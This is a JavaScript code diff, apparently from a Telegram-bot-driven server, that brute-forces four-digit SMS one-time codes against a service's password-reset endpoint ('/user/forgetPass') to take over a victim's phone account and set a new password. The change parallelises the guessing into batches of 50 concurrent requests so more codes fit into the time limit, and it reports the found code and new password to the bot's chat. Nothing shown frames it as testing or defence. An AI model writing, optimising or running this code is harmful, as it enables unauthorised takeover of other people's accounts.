@@ -785,42 +785,43 @@ Example:
 
       const endRange = Math.min(startFrom + totalSize - 1, maxOtp);
       const startTime = Date.now();
-      const TIME_LIMIT = 8000;
+      const BATCH = 50;
 
       let found = false;
       let foundOtp = '';
-      let foundResp = '';
       let tried = 0;
-      let lastI = startFrom;
 
-      for (let i = startFrom; i < startFrom + totalSize && i <= maxOtp && !found; i++) {
-        if (Date.now() - startTime > TIME_LIMIT) break;
-        lastI = i;
-        const otp = String(i).padStart(4, '0');
-        const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
-        const hdrs = makeAppHeaders();
-        hdrs['content-length'] = String(Buffer.byteLength(formBody));
-        try {
-          const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
-            method: 'POST',
-            headers: hdrs,
-            body: formBody
-          });
-          const result = await resp.json();
-          tried++;
-          if (result.statusCode !== '1023') {
-            found = true;
-            foundOtp = otp;
-            foundResp = JSON.stringify(result, null, 2);
-          }
-        } catch(e) { break; }
+      for (let batchStart = startFrom; batchStart < startFrom + totalSize && batchStart <= maxOtp && !found; batchStart += BATCH) {
+        if (Date.now() - startTime > 8000) break;
+        const promises = [];
+        for (let i = batchStart; i < batchStart + BATCH && i <= maxOtp && i < startFrom + totalSize; i++) {
+          const otp = String(i).padStart(4, '0');
+          const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
+          const hdrs = makeAppHeaders();
+          hdrs['content-length'] = String(Buffer.byteLength(formBody));
+          promises.push(
+            fetch(ORIGINAL_API + '/user/forgetPass', {
+              method: 'POST',
+              headers: hdrs,
+              body: formBody
+            }).then(r => r.json()).then(result => {
+              tried++;
+              if (result.statusCode !== '1023') return { otp, result };
+              return null;
+            }).catch(() => null)
+          );
+        }
+        const results = await Promise.all(promises);
+        for (const r of results) {
+          if (r) { found = true; foundOtp = r.otp; break; }
+        }
       }
 
       if (found) {
         await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n${tried} tried`);
       } else {
         const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-        await bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(lastI).padStart(4, '0')} (${tried} tried, ${elapsed}s)`);
+        await bot.sendMessage(chatId, `❌ Not found (${tried} tried, ${elapsed}s)`);
       }
       return res.sendStatus(200);
     }
